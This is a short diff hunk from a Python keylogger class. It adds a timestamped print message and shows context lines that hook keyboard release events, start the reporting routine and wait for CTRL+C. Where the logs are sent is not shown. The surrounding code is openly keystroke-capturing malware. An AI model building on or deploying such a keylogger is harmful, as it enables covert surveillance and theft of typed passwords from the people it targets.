@@ -102,6 +102,8 @@ class Keylogger:
         keyboard.on_release(callback=self.callback)
         # start reporting the keylogs
         self.report()
+        # make a simple message
+        print(f"{datetime.now()} - Started keylogger")
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
 
